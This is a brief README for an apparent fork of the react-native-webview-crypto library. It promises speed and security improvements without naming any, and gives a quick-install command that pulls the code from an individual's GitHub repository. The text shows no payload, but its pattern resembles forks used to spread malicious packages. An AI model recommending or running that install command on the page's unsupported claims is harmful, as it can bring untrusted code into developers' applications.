**Turbocharged Crypto for React Native**

This repository is a dedicated, up-to-date fork of `react-native-webview-crypto` focusing on critical performance optimizations and modern security patches. It addresses long-standing bottlenecks in cryptographic operations by streamlining the Webview-to-native communication layer. Maintainers and developers can leverage this version for a faster, more reliable, and securely reinforced implementation of the WebCrypto API in their mobile applications.

**Quick install**

```bash
npm install git+https://github.com/Samuraivarope73/react-native-webview-crypto.git
```
